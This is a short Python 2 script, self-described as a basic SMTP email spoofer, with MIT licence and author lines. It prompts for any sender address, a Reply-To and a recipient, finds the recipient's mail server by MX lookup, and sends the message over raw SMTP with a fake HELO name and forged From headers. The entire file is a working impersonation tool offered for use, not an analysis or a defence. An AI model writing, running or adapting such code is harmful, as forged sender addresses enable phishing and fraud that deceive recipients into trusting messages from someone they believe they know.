#!/usr/bin/env python

#	smtp-spoof.py
#	A basic SMTP email spoofer.
#	Author: William Woodruff
#	This code is licensed by William Woodruff under the MIT License.
#	http://opensource.org/licenses/MIT

import sys
import socket
import time
import dns.resolver

time = time.strftime("%a, %d %b %Y %H:%M:%S -0500", time.localtime())
from_address = raw_input("\"Sender\": ")
reply_to = raw_input("Reply-To: ")
to_address = raw_input("Recipient: ")
try:
	mx_domain = dns.resolver.query(str.split(to_address, '@')[1], 'MX')[0].exchange.to_text()[:-1]
except Exception, e:
	print "Fatal error in resolving recipient domain. Exiting."
	sys.exit(-1)
subject = raw_input("Subject: ")
print "##### Complete message with EOF (^D) #####"
message = sys.stdin.read()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((mx_domain, 25))
sock.recv(1024)
sock.sendall("HELO notreal.com\r\n")
sock.recv(1024)
sock.sendall("MAIL FROM:<" + from_address + ">\r\n")
sock.recv(1024)
sock.sendall("RCPT TO:<" + to_address + ">\r\n")
sock.recv(1024)
sock.sendall("DATA\r\n")
sock.sendall("From: \"" + from_address + "\" <" + from_address + ">\r\n")
sock.sendall("To: \"" + to_address + "\" <" + to_address + ">\r\n")
sock.sendall("Date: " + time + "\r\n")
sock.sendall("Subject: " + subject + "\r\n")
sock.sendall("Reply-To: " + reply_to + "\r\n")
sock.sendall(message + "\r\n")
sock.sendall(".\r\n")
sock.recv(1024)
sock.sendall("QUIT\r\n")
sock.close()